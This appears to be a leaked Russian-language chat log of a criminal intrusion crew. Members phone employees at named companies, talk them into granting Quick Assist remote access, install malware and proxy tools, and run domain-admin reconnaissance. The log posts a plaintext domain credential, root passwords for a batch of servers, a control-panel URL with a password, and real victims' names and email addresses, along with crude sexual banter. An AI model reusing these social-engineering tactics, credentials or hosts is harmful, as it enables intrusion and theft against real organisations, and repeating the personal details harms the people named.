+[2024-06-19 13:01:43] @usernameugway:matrix.bestflowers247.online: принял
+--------------------
+[2024-06-19 13:01:54] @lincoln:artronica.rocks: 🚀
+--------------------
+[2024-06-19 13:03:18] @usernameugway:matrix.bestflowers247.online: > <@usernameugway:matrix.bestflowers247.online> Headquarters
+> 2-4 Hoehnerweg, Weinheim, Baden-Wuerttemberg, 6...
+> Phone Number
+> (630) 898-3319
+> Website
+> www.freudenberg.com
+> Revenue
+> $9.8 Billion
+
+это она ввела пароль если что
+--------------------
+[2024-06-19 13:04:41] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2024-06-19 13:05:43] @usernamegg:matrix.bestflowers247.online: qwertyuio.txt
+--------------------
+[2024-06-19 13:05:55] @usernamegg:matrix.bestflowers247.online: Headquarters
+2-4 Hoehnerweg, Weinheim, Baden-Wuerttemberg, 6...
+Phone Number
+(630) 898-3319
+Website
+www.freudenberg.com
+Revenue
+$9.8 Billion
+--------------------
+[2024-06-19 13:06:04] @usernamegg:matrix.bestflowers247.online: нет
+--------------------
+[2024-06-19 13:07:38] @usernamejj:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> Headquarters
+> 2-4 Hoehnerweg, Weinheim, Baden-Wuerttemberg, 6...
+> Phone Number
+> (630) 898-3319
+> Website
+> www.freudenberg.com
+> Revenue
+> $9.8 Billion
+
+++
+--------------------
+[2024-06-19 13:08:08] @usernamegg:matrix.bestflowers247.online: 30 dns
+--------------------
+[2024-06-19 13:08:12] @usernamegg:matrix.bestflowers247.online: только что чекай
+--------------------
+[2024-06-19 13:12:17] @usernamegg:matrix.bestflowers247.online: 91.196.70.160:44845
+--------------------
+[2024-06-19 13:12:19] @usernamegg:matrix.bestflowers247.online: 91.196.70.160:37213
+--------------------
+[2024-06-19 13:12:22] @usernamegg:matrix.bestflowers247.online: 91.196.70.160:37213
+--------------------
+[2024-06-19 13:13:16] @usernamegg:matrix.bestflowers247.online: ну что ?
+--------------------
+[2024-06-19 13:13:53] @mel:artronica.rocks: набери еще раз slynch@ax-uk.com
+--------------------
+[2024-06-19 13:14:01] @usernamegg:matrix.bestflowers247.online: тачка есть
+--------------------
+[2024-06-19 13:14:01] @usernamegg:matrix.bestflowers247.online: INVITE:INVITE\F22SteNic:Scfreiburg10%
+
+--------------------
+[2024-06-19 13:14:03] @usernamegg:matrix.bestflowers247.online: есть
+--------------------
+[2024-06-19 13:14:06] @usernamegg:matrix.bestflowers247.online: сокс есть
+--------------------
+[2024-06-19 13:14:10] @lincoln:artronica.rocks: он не работает
+--------------------
+[2024-06-19 13:14:12] @usernamegg:matrix.bestflowers247.online: уходи куда нибудь быстрее
+--------------------
+[2024-06-19 13:14:44] @lincoln:artronica.rocks: ее отключили
+--------------------
+[2024-06-19 13:15:10] @mel:artronica.rocks: кто отключил?
+--------------------
+[2024-06-19 13:15:25] @lincoln:artronica.rocks: система безопасности ax-uk.com
+--------------------
+[2024-06-19 13:15:40] @usernamegg:matrix.bestflowers247.online: ```
+Microsoft Windows [Version 10.0.19045.4529]
+(c) Microsoft Corporation. Alle Rechte vorbehalten.
+
+C:\Users\F22SteNic>rundll32 update5.dll, LogSetMode
+
+C:\Users\F22SteNic>net group "domain controllers" /dom
+Die Anforderung wird auf einem Domänencontroller für Domäne invite.freudenberg verarbeitet.
+
+Gruppenname      Domain Controllers
+Beschreibung     All domain controllers in the domain
+
+Mitglieder
+
+-------------------------------------------------------------------------------
+F00AZ1S0001$             F00AZ1S0002$             F00AZ1S0011$
+F00AZ1S0012$             F00WHM1S0001$            F00WHM1S0002$
+F00WHM1S0003$            F00WHM1S0004$
+Der Befehl wurde erfolgreich ausgeführt.
+
+
+C:\Users\F22SteNic>net group "domain admins" /dom
+Die Anforderung wird auf einem Domänencontroller für Domäne invite.freudenberg verarbeitet.
+
+Gruppenname      Domain Admins
+Beschreibung     Designated administrators of the domain
+
+Mitglieder
+
+-------------------------------------------------------------------------------
+Administrator            fcaF02VUMS-ScanDC
+Der Befehl wurde erfolgreich ausgeführt.
+
+
+C:\Users\F22SteNic>
+```
+--------------------
+[2024-06-19 13:15:40] @mel:artronica.rocks: может она просто на обеде была
+--------------------
+[2024-06-19 13:15:46] @mel:artronica.rocks: а сейчас вернулась
+--------------------
+[2024-06-19 13:15:47] @lincoln:artronica.rocks: нет )
+--------------------
+[2024-06-19 13:16:07] @lincoln:artronica.rocks: отключена
+--------------------
+[2024-06-19 13:16:15] @lincoln:artronica.rocks: ну я звонил ей с двух аккаунтов
+--------------------
+[2024-06-19 13:16:17] @lincoln:artronica.rocks: гудка нет
+--------------------
+[2024-06-19 13:16:21] @lincoln:artronica.rocks: и еще раз 2 раза набрал
+--------------------
+[2024-06-19 13:16:48] @lincoln:artronica.rocks: https://prnt.sc/mh7U6RulvLTp
+--------------------
+[2024-06-19 13:16:52] @lincoln:artronica.rocks: видишь белый
+--------------------
+[2024-06-19 13:16:57] @lincoln:artronica.rocks: либо красный или зеленый
+--------------------
+[2024-06-19 13:17:06] @lincoln:artronica.rocks: она не в зоне доступа
+--------------------
+[2024-06-19 13:17:17] @usernamegg:matrix.bestflowers247.online: ax-uk.com - другие контакты соберите по ним и все
+--------------------
+[2024-06-19 13:17:22] @lincoln:artronica.rocks: она уже не в сети
+--------------------
+[2024-06-19 13:20:19] @usernamegg:matrix.bestflowers247.online: image.png
+--------------------
+[2024-06-19 13:22:55] @usernamegg:matrix.bestflowers247.online: там добрый тип на проводе
+--------------------
+[2024-06-19 13:23:05] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2024-06-19 13:24:13] @usernamegg:matrix.bestflowers247.online: даже ру деф отрегировал
+--------------------
+[2024-06-19 13:24:17] @usernamegg:matrix.bestflowers247.online: > <@burito:matrix.bestflowers247.online> sent a file.
+
+!
+--------------------
+[2024-06-19 13:24:23] @usernamegg:matrix.bestflowers247.online: Снимок экрана 2024-06-19 в 16.24.00.png
+--------------------
+[2024-06-19 13:24:50] @mel:artronica.rocks: > <@mel:artronica.rocks> PhilipSchonewille@sIatergordon.onmicrosoft.com
+
+погнали звонить
+--------------------
+[2024-06-19 13:24:55] @lincoln:artronica.rocks: поехали
+--------------------
+[2024-06-19 13:25:17] @usernamegg:matrix.bestflowers247.online: не пойдет такое
+--------------------
+[2024-06-19 13:25:42] @usernamegg:matrix.bestflowers247.online: https://avcheck.net/id/PXK2VrSeOxJU
+--------------------
+[2024-06-19 13:25:47] @usernamegg:matrix.bestflowers247.online: ну а тут картинка хорошая
+--------------------
+[2024-06-19 13:26:04] @usernamegg:matrix.bestflowers247.online: подпиши сертом что там бурито крайнее сделал
+--------------------
+[2024-06-19 13:26:27] @usernameyy:matrix.bestflowers247.online: хорошо
+--------------------
+[2024-06-19 13:26:56] @usernamegg:matrix.bestflowers247.online: ты тут еще ?
+--------------------
+[2024-06-19 13:26:59] @usernameyy:matrix.bestflowers247.online: да
+--------------------
+[2024-06-19 13:27:04] @usernamegg:matrix.bestflowers247.online: я поднимусь ща
+--------------------
+[2024-06-19 13:27:07] @usernameyy:matrix.bestflowers247.online: ой
+--------------------
+[2024-06-19 13:27:08] @usernameyy:matrix.bestflowers247.online: там нет
+--------------------
+[2024-06-19 13:27:14] @usernameyy:matrix.bestflowers247.online: я думал ты имел в виду работаю ли
+--------------------
+[2024-06-19 13:27:22] @usernameyy:matrix.bestflowers247.online: а чего там
+--------------------
+[2024-06-19 13:27:24] @usernamegg:matrix.bestflowers247.online: дома уже ?
+--------------------
+[2024-06-19 13:27:26] @usernameyy:matrix.bestflowers247.online: да
+--------------------
+[2024-06-19 13:27:29] @usernamegg:matrix.bestflowers247.online: норм
+--------------------
+[2024-06-19 13:27:33] @usernamegg:matrix.bestflowers247.online: быстро ты )
+--------------------
+[2024-06-19 13:27:36] @usernameyy:matrix.bestflowers247.online: пробок не было сегодня
+--------------------
+[2024-06-19 13:27:51] @usernameyy:matrix.bestflowers247.online: в это время трафик плотный очень, сегодня быстро получилось
+--------------------
+[2024-06-19 13:27:53] @usernamegg:matrix.bestflowers247.online: шикарно
+--------------------
+[2024-06-19 13:29:12] @usernameyy:matrix.bestflowers247.online: build.exe
+--------------------
+[2024-06-19 13:29:14] @usernameyy:matrix.bestflowers247.online: подписанный от бурито
+--------------------
+[2024-06-19 13:30:03] @lincoln:artronica.rocks: anydesk blocked на закачку
+--------------------
+[2024-06-19 13:30:07] @lincoln:artronica.rocks: идем по другой схеме
+--------------------
+[2024-06-19 13:30:12] @burito:matrix.bestflowers247.online: Щас подумаю ещё вариант
+--------------------
+[2024-06-19 13:30:29] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2024-06-19 13:31:53] @usernamegg:matrix.bestflowers247.online: долго молчал деф
+--------------------
+[2024-06-19 13:31:55] @usernamegg:matrix.bestflowers247.online: все равно заорал
+--------------------
+[2024-06-19 13:32:18] @burito:matrix.bestflowers247.online: А подпись не пробовали?
+--------------------
+[2024-06-19 13:33:23] @usernamejj:matrix.bestflowers247.online: krb5.txt
+--------------------
+[2024-06-19 13:35:07] @lincoln:artronica.rocks: включайте quick assist
+--------------------
+[2024-06-19 13:35:19] @usernamegg:matrix.bestflowers247.online: только что попробовали
+--------------------
+[2024-06-19 13:35:22] @usernamegg:matrix.bestflowers247.online: долго молчал деф
+--------------------
+[2024-06-19 13:35:25] @usernamegg:matrix.bestflowers247.online: потом заорал
+--------------------
+[2024-06-19 13:35:50] @lincoln:artronica.rocks: Техническая поддержка
+Разрешите пользователям, которым вы доверяете, просматривать экран или управлять компьютером.
+
+Защитный код от помощника
+--------------------
+[2024-06-19 13:36:23] @lincoln:artronica.rocks: дайте код
+--------------------
+[2024-06-19 13:36:25] @lincoln:artronica.rocks: что вы зашли
+--------------------
+[2024-06-19 13:36:40] @lincoln:artronica.rocks: quick assist работает у нее
+--------------------
+[2024-06-19 13:36:52] @mel:artronica.rocks: он не позволяет файлы отправлять
+--------------------
+[2024-06-19 13:37:04] @lincoln:artronica.rocks: он даст доступ
+--------------------
+[2024-06-19 13:37:12] @lincoln:artronica.rocks: через cmd
+--------------------
+[2024-06-19 13:37:20] @lincoln:artronica.rocks: может быть powershell
+--------------------
+[2024-06-19 13:37:25] @lincoln:artronica.rocks: зайди пожалуйста
+--------------------
+[2024-06-19 13:37:26] @lincoln:artronica.rocks: дай код
+--------------------
+[2024-06-19 13:37:44] @mel:artronica.rocks: 2M4C27
+--------------------
+[2024-06-19 13:38:18] @lincoln:artronica.rocks: заходи
+--------------------
+[2024-06-19 13:38:30] @lincoln:artronica.rocks: скажи как войдешь
+--------------------
+[2024-06-19 13:38:37] @ugw:artronica.rocks: в процесе
+--------------------
+[2024-06-19 13:38:50] @ugw:artronica.rocks: вошел
+--------------------
+[2024-06-19 13:39:00] @ugw:artronica.rocks: идем работать
+--------------------
+[2024-06-19 13:39:14] @lincoln:artronica.rocks: сейчас она имейл
+--------------------
+[2024-06-19 13:39:18] @lincoln:artronica.rocks: один проверит
+--------------------
+[2024-06-19 13:39:31] @lincoln:artronica.rocks: и все
+--------------------
+[2024-06-19 13:39:40] @usernamegg:matrix.bestflowers247.online: 777
+--------------------
+[2024-06-19 13:39:42] @usernamegg:matrix.bestflowers247.online: пароль
+--------------------
+[2024-06-19 13:40:05] @ugw:artronica.rocks: устанавливаем
+--------------------
+[2024-06-19 13:40:24] @lincoln:artronica.rocks: +
+--------------------
+[2024-06-19 13:40:39] @lincoln:artronica.rocks: он отключилась от звонка
+--------------------
+[2024-06-19 13:40:44] @lincoln:artronica.rocks: но вы можете работать
+--------------------
+[2024-06-19 13:40:51] @ugw:artronica.rocks: хорошо
+--------------------
+[2024-06-19 13:40:53] @ugw:artronica.rocks: проверяем
+--------------------
+[2024-06-19 13:40:54] @ugw:artronica.rocks: установили
+--------------------
+[2024-06-19 13:40:58] @ugw:artronica.rocks: через терминал
+--------------------
+[2024-06-19 13:41:03] @ugw:artronica.rocks: отбилась
+--------------------
+[2024-06-19 13:41:40] @lincoln:artronica.rocks: звонить ей ?
+--------------------
+[2024-06-19 13:42:46] @ugw:artronica.rocks: минуту
+--------------------
+[2024-06-19 13:42:50] @ugw:artronica.rocks: это какая контора
+--------------------
+[2024-06-19 13:43:12] @lincoln:artronica.rocks: helen.pearson@slatergordon.uk
+--------------------
+[2024-06-19 13:44:19] @usernameugway:matrix.bestflowers247.online: заходи в левеел
+--------------------
+[2024-06-19 13:44:34] @mel:artronica.rocks: image.png
+--------------------
+[2024-06-19 13:45:12] @usernameugway:matrix.bestflowers247.online: поставили там левел
+--------------------
+[2024-06-19 13:45:12] @usernamegg:matrix.bestflowers247.online: так так
+--------------------
+[2024-06-19 13:45:18] @usernameugway:matrix.bestflowers247.online: через квикасист
+--------------------
+[2024-06-19 13:45:25] @lincoln:artronica.rocks: скажи как набирать
+--------------------
+[2024-06-19 13:45:35] @mel:artronica.rocks: helen.pearson@slatergordon.uk
+--------------------
+[2024-06-19 13:45:53] @ugw:artronica.rocks: идем дальше пока что
+--------------------
+[2024-06-19 13:46:10] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2024-06-19 13:46:14] @ugw:artronica.rocks: если что-то понадоибтся я скажу -  с квиком хорошо получилось сейчас
+--------------------
+[2024-06-19 13:46:20] @usernamegg:matrix.bestflowers247.online: это они ?
+--------------------
+[2024-06-19 13:46:30] @mel:artronica.rocks: да
+--------------------
+[2024-06-19 13:46:34] @usernameugway:matrix.bestflowers247.online: ax-uk.com сейчас этих начнем
+собрали контакты делаем акк под них
+--------------------
+[2024-06-19 13:46:39] @usernamegg:matrix.bestflowers247.online: креды ввела ?
+--------------------
+[2024-06-19 13:46:39] @mel:artronica.rocks: через квик ассист
+--------------------
+[2024-06-19 13:46:42] @mel:artronica.rocks: дал поставить
+--------------------
+[2024-06-19 13:46:44] @lincoln:artronica.rocks: отлично
+--------------------
+[2024-06-19 13:46:45] @mel:artronica.rocks: левел
+--------------------
+[2024-06-19 13:46:47] @usernamegg:matrix.bestflowers247.online: как будь то русская винда
+--------------------
+[2024-06-19 13:46:48] @usernamegg:matrix.bestflowers247.online: это
+--------------------
+[2024-06-19 13:46:50] @mel:artronica.rocks: мы не запустили ничего
+--------------------
+[2024-06-19 13:47:13] @lincoln:artronica.rocks: можно эту партию сотрудников через квик делать ?
+--------------------
+[2024-06-19 13:47:29] @usernamegg:matrix.bestflowers247.online: это русская впска
+--------------------
+[2024-06-19 13:47:31] @usernamegg:matrix.bestflowers247.online: Снимок экрана 2024-06-19 в 16.47.19.png
+--------------------
+[2024-06-19 13:47:36] @usernamegg:matrix.bestflowers247.online: Снимок экрана 2024-06-19 в 16.47.19.png
+--------------------
+[2024-06-19 13:47:45] @ugw:artronica.rocks: да
+--------------------
+[2024-06-19 13:47:51] @usernamegg:matrix.bestflowers247.online: это ру впска
+--------------------
+[2024-06-19 13:48:08] @mel:artronica.rocks: )))
+--------------------
+[2024-06-19 13:48:17] @mel:artronica.rocks: может я свой дед туда просто закинул
+--------------------
+[2024-06-19 13:48:21] @mel:artronica.rocks: блять)
+--------------------
+[2024-06-19 13:48:34] @mel:artronica.rocks: давай еще раз наберем эту женщину
+--------------------
+[2024-06-19 13:48:35] @usernameugway:matrix.bestflowers247.online: френдли фаер походу)) затупили с квиком )
+--------------------
+[2024-06-19 13:48:38] @mel:artronica.rocks: прошлую
+--------------------
+[2024-06-19 13:48:42] @usernameugway:matrix.bestflowers247.online: пара минут разберемся
+--------------------
+[2024-06-19 13:48:45] @lincoln:artronica.rocks: что нужно
+--------------------
+[2024-06-19 13:48:47] @mel:artronica.rocks: что-то не так получилось)
+--------------------
+[2024-06-19 13:48:51] @lincoln:artronica.rocks: скажи пожалуйста
+--------------------
+[2024-06-19 13:48:52] @usernameugway:matrix.bestflowers247.online: сами себе поставили на дедик видимо
+--------------------
+[2024-06-19 13:48:53] @usernameugway:matrix.bestflowers247.online: )))
+--------------------
+[2024-06-19 13:48:53] @lincoln:artronica.rocks: хорошо
+--------------------
+[2024-06-19 13:48:57] @mel:artronica.rocks: опять восстановить сессию
+--------------------
+[2024-06-19 13:49:00] @mel:artronica.rocks: в квике
+--------------------
+[2024-06-19 13:49:01] @lincoln:artronica.rocks: quick assist код дай сразу
+--------------------
+[2024-06-19 13:49:05] @mel:artronica.rocks: ща
+--------------------
+[2024-06-19 13:49:31] @mel:artronica.rocks: FAWU3G
+--------------------
+[2024-06-19 13:49:37] @lapa:matrix.bestflowers247.online: +
+--------------------
+[2024-06-19 13:49:47] @usernamegg:matrix.bestflowers247.online: удалил
+--------------------
+[2024-06-19 13:49:50] @usernamegg:matrix.bestflowers247.online: удалил
+--------------------
+[2024-06-19 13:50:03] @mel:artronica.rocks: ок)
+--------------------
+[2024-06-19 13:50:05] @lincoln:artronica.rocks: заходите
+--------------------
+[2024-06-19 13:50:15] @mel:artronica.rocks: иду
+--------------------
+[2024-06-19 13:50:21] @lincoln:artronica.rocks: скажешь как зайдешь
+--------------------
+[2024-06-19 13:50:48] @mel:artronica.rocks: пусть одобрит мне запрос
+--------------------
+[2024-06-19 13:50:51] @mel:artronica.rocks: на управление
+--------------------
+[2024-06-19 13:51:01] @lincoln:artronica.rocks: да конечно
+--------------------
+[2024-06-19 13:51:03] @lincoln:artronica.rocks: все сделает
+--------------------
+[2024-06-19 13:51:08] @lincoln:artronica.rocks: она говорит i love mel
+--------------------
+[2024-06-19 13:51:08] @mel:artronica.rocks: все ок
+--------------------
+[2024-06-19 13:51:21] @usernamegg:matrix.bestflowers247.online: ))
+--------------------
+[2024-06-19 13:51:36] @usernamegg:matrix.bestflowers247.online: nico.steiert@freudenberg.com
+--------------------
+[2024-06-19 13:51:36] @lincoln:artronica.rocks: mel i can suck you off
+--------------------
+[2024-06-19 13:51:46] @lapa:matrix.bestflowers247.online: ```
+http://217.15.175.191/4d4c5ad620396dae72d40d9a2e3a4dfe/
+adm443
+```
+--------------------
+[2024-06-19 13:51:50] @lincoln:artronica.rocks: я говорю you wanna have threesome
+--------------------
+[2024-06-19 13:51:55] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2024-06-19 13:51:55] @lincoln:artronica.rocks: me mel and you )
+--------------------
+[2024-06-19 13:51:57] @lincoln:artronica.rocks: Okay sure
+--------------------
+[2024-06-19 13:52:11] @lapa:matrix.bestflowers247.online: скоро exe сброшу
+--------------------
+[2024-06-19 13:52:11] @mel:artronica.rocks: нужно чтобы она пароль от компа ввела
+--------------------
+[2024-06-19 13:52:13] @mel:artronica.rocks: в окне
+--------------------
+[2024-06-19 13:52:16] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2024-06-19 13:52:33] @lapa:matrix.bestflowers247.online: socks-175.191.exe
+--------------------
+[2024-06-19 13:52:41] @lincoln:artronica.rocks: сейчас вводит
+--------------------
+[2024-06-19 13:52:45] @mel:artronica.rocks: image.png
+--------------------
+[2024-06-19 13:52:58] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2024-06-19 13:53:03] @usernamegg:matrix.bestflowers247.online: socks-175.191.exe
+--------------------
+[2024-06-19 13:53:20] @lincoln:artronica.rocks: проблема
+--------------------
+[2024-06-19 13:53:25] @lincoln:artronica.rocks: она не заходит по паролю
+--------------------
+[2024-06-19 13:53:33] @lincoln:artronica.rocks: она заходи по face
+--------------------
+[2024-06-19 13:53:38] @mel:artronica.rocks: пусть еще попробует
+--------------------
+[2024-06-19 13:53:50] @mel:artronica.rocks: введет свой емейл и пароль от почты
+--------------------
+[2024-06-19 13:53:51] @lincoln:artronica.rocks: сейчас сходит
+--------------------
+[2024-06-19 13:54:05] @lapa:matrix.bestflowers247.online: для брута делаю сервера?
+--------------------
+[2024-06-19 13:54:07] @lincoln:artronica.rocks: она сказала что ей нужно идти
+--------------------
+[2024-06-19 13:54:13] @lincoln:artronica.rocks: может заподозрила что-то ?
+--------------------
+[2024-06-19 13:54:19] @lapa:matrix.bestflowers247.online: если они будут выдавать по будням по 20 серверов
+--------------------
+[2024-06-19 13:54:21] @lincoln:artronica.rocks: резко свалила
+--------------------
+[2024-06-19 13:54:23] @mel:artronica.rocks: поехали дальше
+--------------------
+[2024-06-19 13:54:27] @lapa:matrix.bestflowers247.online: это 2 месяца займет
+--------------------
+[2024-06-19 13:54:35] @lapa:matrix.bestflowers247.online: а не 1 месяц, как обещали
+--------------------
+[2024-06-19 13:54:39] @lincoln:artronica.rocks: ну так норм ?
+--------------------
+[2024-06-19 13:54:41] @muaddib6:matrix.org: ++
+--------------------
+[2024-06-19 13:54:44] @lapa:matrix.bestflowers247.online: 2.5 месяца даже
+--------------------
+[2024-06-19 13:54:48] @usernamegg:matrix.bestflowers247.online: да
+--------------------
+[2024-06-19 13:54:50] @mel:artronica.rocks: да пока непонятно
+--------------------
+[2024-06-19 13:54:52] @usernamegg:matrix.bestflowers247.online: 30 штук сегодня
+--------------------
+[2024-06-19 13:54:57] @mel:artronica.rocks: файлы передавать нельзя
+--------------------
+[2024-06-19 13:55:01] @lapa:matrix.bestflowers247.online: по хорошу 50 штук в день должны выдавать
+--------------------
+[2024-06-19 13:55:05] @mel:artronica.rocks: только если введут апроль
+--------------------
+[2024-06-19 13:55:06] @lapa:matrix.bestflowers247.online: * по хорошему 50 штук в день должны выдавать
+--------------------
+[2024-06-19 13:55:07] @mel:artronica.rocks: пароль
+--------------------
+[2024-06-19 13:55:11] @lapa:matrix.bestflowers247.online: чтобы в 1 месяц вложится
+--------------------
+[2024-06-19 13:55:14] @usernamegg:matrix.bestflowers247.online: 1000 ?
+--------------------
+[2024-06-19 13:55:17] @lapa:matrix.bestflowers247.online: * чтобы в 1 месяц вложиться
+--------------------
+[2024-06-19 13:55:23] @mel:artronica.rocks: чтобы мы попали в пауершел
+--------------------
+[2024-06-19 13:55:26] @lapa:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> 1000 ?
+
+да, берите пока 1к
+--------------------
+[2024-06-19 13:55:33] @lapa:matrix.bestflowers247.online: я их максимально заюзаю
+--------------------
+[2024-06-19 13:55:34] @mel:artronica.rocks: иначе все бессмысленно
+--------------------
+[2024-06-19 13:55:43] @mel:artronica.rocks: нужен или аник или тимвивер
+--------------------
+[2024-06-19 13:55:54] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2024-06-19 13:56:25] @lincoln:artronica.rocks: один отвалился
+--------------------
+[2024-06-19 13:56:47] @lapa:matrix.bestflowers247.online: сейчас скорость 80к пассов в секунду средняя
+--------------------
+[2024-06-19 13:57:26] @lincoln:artronica.rocks: teamviewer
+--------------------
+[2024-06-19 13:58:00] @lapa:matrix.bestflowers247.online: с этими серверми думаю будет 1.5-2 млн с секунду
+--------------------
+[2024-06-19 13:58:06] @lapa:matrix.bestflowers247.online: * с этими серверми думаю будет 1.5-2 млн в секунду
+--------------------
+[2024-06-19 13:58:15] @usernamegg:matrix.bestflowers247.online: нормально /)
+--------------------
+[2024-06-19 13:58:21] @lincoln:artronica.rocks: quick assist
+--------------------
+[2024-06-19 13:58:32] @lincoln:artronica.rocks: только
+--------------------
+[2024-06-19 13:58:40] @lincoln:artronica.rocks: тоже все в блоке
+--------------------
+[2024-06-19 13:59:03] @lincoln:artronica.rocks: дай код
+--------------------
+[2024-06-19 13:59:16] @mel:artronica.rocks: 6MK8V6
+--------------------
+[2024-06-19 14:00:03] @lincoln:artronica.rocks: заходите
+--------------------
+[2024-06-19 14:00:07] @lincoln:artronica.rocks: скажи как зайдешь
+--------------------
+[2024-06-19 14:00:18] @ugw:artronica.rocks: делаем
+--------------------
+[2024-06-19 14:00:18] @ugw:artronica.rocks: мин
+--------------------
+[2024-06-19 14:00:28] @ugw:artronica.rocks: зашел
+--------------------
+[2024-06-19 14:00:29] @ugw:artronica.rocks: запросил доступ
+--------------------
+[2024-06-19 14:00:35] @lincoln:artronica.rocks: он дал ?
+--------------------
+[2024-06-19 14:00:42] @ugw:artronica.rocks: нет
+--------------------
+[2024-06-19 14:01:03] @ugw:artronica.rocks: нажали кнопку чтобы досутп предоставил пусть сделает
+--------------------
+[2024-06-19 14:01:31] @lincoln:artronica.rocks: блять
+--------------------
+[2024-06-19 14:01:33] @lincoln:artronica.rocks: сек
+--------------------
+[2024-06-19 14:01:36] @lincoln:artronica.rocks: не берет теперь
+--------------------
+[2024-06-19 14:01:53] @ugw:artronica.rocks: но мы там видим что происходит
+--------------------
+[2024-06-19 14:02:00] @ugw:artronica.rocks: но доступ не дает
+--------------------
+[2024-06-19 14:02:06] @lincoln:artronica.rocks: он отошел или работает ?
+--------------------
+[2024-06-19 14:02:19] @ugw:artronica.rocks: ничего не делает
+--------------------
+[2024-06-19 14:02:20] @ugw:artronica.rocks: может отошел
+--------------------
+[2024-06-19 14:02:24] @ugw:artronica.rocks: подышать
+--------------------
+[2024-06-19 14:02:25] @lincoln:artronica.rocks: да
+--------------------
+[2024-06-19 14:02:34] @lincoln:artronica.rocks: скажи если что-то будет чтоб я ему позвонил
+--------------------
+[2024-06-19 14:03:03] @usernamegg:matrix.bestflowers247.online: ```
+31
+45.141.86.41
+root
+[}dBkkkt34v9TQS
+
+32
+45.141.86.244
+root
+L.Z7g_E[$21240T
+
+33
+45.141.86.245
+root
+hX0U[W0CdS6q$/0
+
+34
+45.141.86.246
+root
+Nm2$@c7&g5PkV=8
+
+35
+45.141.86.247
+root
+zw2k@WXL&NdX)Nh
+
+36
+45.141.86.249
+root
+LO7Pa:AI+pl#&Zq
+
+37
+45.141.86.250
+root
+GdD]v2$k7%Il@>Q
+
+38
+45.141.86.251
+root
+IByP5R[Nc,vP77i
+
+39
+45.141.86.252
+root
+od\8vMKYogW0ypG
+
+40
+45.141.86.253
+root
+mWyH/FW+nv6b7!Y
+```
+--------------------
+[2024-06-19 14:03:56] @usernamegg:matrix.bestflowers247.online: конторы просто пиздец мощные по ревеню
+--------------------
+[2024-06-19 14:04:02] @ugw:artronica.rocks: ок пока смотрим что там у него
+--------------------
+[2024-06-19 14:04:04] @usernamegg:matrix.bestflowers247.online: они нпичканы всем чем можно
+--------------------
+[2024-06-19 14:04:06] @ugw:artronica.rocks: цитрикс стоит
+--------------------
+[2024-06-19 14:04:13] @lincoln:artronica.rocks: отично
+--------------------
+[2024-06-19 14:04:16] @usernamegg:matrix.bestflowers247.online: давай попробуем взять диапозон от 200м до 1b
+--------------------
+[2024-06-19 14:04:21] @usernamegg:matrix.bestflowers247.online: им только начнем звонить
+--------------------
+[2024-06-19 14:04:40] @usernameugway:matrix.bestflowers247.online: хорошо
+--------------------
+[2024-06-19 14:05:02] @usernamegg:matrix.bestflowers247.online: ну там стоит у них какй нибудь фалкон и все
+--------------------
+[2024-06-19 14:05:09] @usernamegg:matrix.bestflowers247.online: ничего он не даст делать
+--------------------
+[2024-06-19 14:05:18] @usernamegg:matrix.bestflowers247.online: они научились большие компании защищать
+--------------------
+[2024-06-19 14:05:36] @usernamegg:matrix.bestflowers247.online: чуть позже начнем делать и с фалконом но пока он прям очень жестокий
+--------------------
+[2024-06-19 14:06:01] @lincoln:artronica.rocks: пока не берет
+--------------------
+[2024-06-19 14:06:09] @usernameugway:matrix.bestflowers247.online: принял
+--------------------
+[2024-06-19 14:06:42] @usernamegg:matrix.bestflowers247.online: бро, мы договорились 100 до воскресенья, верно?) до воскр все будет
+я написал - сегодня ждем 30, значит ждем) у нас не белый дц, как ты мог подумать, и штат там не миллион человек, все же в ручную ставится, мы итак максимально быстро делаем!) народ на форуме вон 1 сервер выдает по несколько суток 😂
+
+это можно в теории сделать, но надо закупить железо все разом
+
+скоро отдам еще часть бро!
+--------------------
+[2024-06-19 14:07:47] @lapa:matrix.bestflowers247.online: +
+--------------------
+[2024-06-19 14:08:00] @lincoln:artronica.rocks: request control-allow
+--------------------
+[2024-06-19 14:08:03] @lincoln:artronica.rocks: ждем
+--------------------
+[2024-06-19 14:08:51] @mel:artronica.rocks: image.png
+--------------------
+[2024-06-19 14:08:52] @mel:artronica.rocks: вот так выглядит запрос
+--------------------
+[2024-06-19 14:09:29] @usernamegg:matrix.bestflowers247.online: можнт обновишь файла ?
+--------------------
+[2024-06-19 14:09:47] @usernamegg:matrix.bestflowers247.online: что за сегодня набрутилось и что за вчера
+--------------------
+[2024-06-19 14:09:56] @usernamegg:matrix.bestflowers247.online: сегодня юсу звонить не будет
+--------------------
+[2024-06-19 14:11:09] @lapa:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> можнт обновишь файла ?
+
+не понял.. я же сбросил, что набрутилось
+--------------------
+[2024-06-19 14:12:45] @lapa:matrix.bestflowers247.online: или вы уже все проверили?
+--------------------
+[2024-06-19 14:13:02] @usernamegg:matrix.bestflowers247.online: нет
+--------------------
+[2024-06-19 14:13:08] @usernamegg:matrix.bestflowers247.online: обрабатывали все что было со звонокв
+--------------------
+[2024-06-19 14:13:17] @usernamegg:matrix.bestflowers247.online: в юсе выходной сегоня юсу звонить не будем
+--------------------
+[2024-06-19 14:13:24] @usernamegg:matrix.bestflowers247.online: будем сейчас обрабатывать весь брут
+--------------------
+[2024-06-19 14:13:41] @usernamegg:matrix.bestflowers247.online: я не стал просто внимание рассеивать
+--------------------
+[2024-06-19 14:13:48] @lapa:matrix.bestflowers247.online: =
+--------------------
+[2024-06-19 14:13:49] @lapa:matrix.bestflowers247.online: +
+--------------------
+[2024-06-19 14:13:52] @usernamegg:matrix.bestflowers247.online: за сегодня что то с утра собралось ?
+--------------------
+[2024-06-19 14:13:56] @usernamegg:matrix.bestflowers247.online: до этой минуты
+--------------------
+[2024-06-19 14:14:01] @usernamegg:matrix.bestflowers247.online: если да то обнови файлы и перезалей
+--------------------
+[2024-06-19 14:14:09] @lapa:matrix.bestflowers247.online: ок, скоро перезалью
+--------------------
